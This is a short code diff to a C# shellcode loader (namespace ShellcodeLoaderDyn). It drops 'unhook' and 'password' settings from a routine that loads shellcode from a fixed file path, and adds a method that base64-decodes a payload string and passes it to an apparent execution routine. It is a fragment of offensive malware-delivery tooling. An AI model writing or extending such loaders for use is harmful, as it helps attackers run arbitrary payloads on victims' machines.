@@ -1188,8 +1188,6 @@ namespace ShellcodeLoaderDyn
         {
             // PARAMS
             string filename = "C:\\Users\\Public\\BIPCD\\shellcode.bin";
-            bool unhook = true;
-            string password = null;
 
             if (!File.Exists(filename))
             {
@@ -1212,6 +1210,10 @@ namespace ShellcodeLoaderDyn
             return Go(rawcontent);
         }
 
+        public static int GoB64(string payload)
+        {
+            return Go(Convert.FromBase64String(payload));
+        }
 
         public static int Go(byte[] rawcontent)
         {
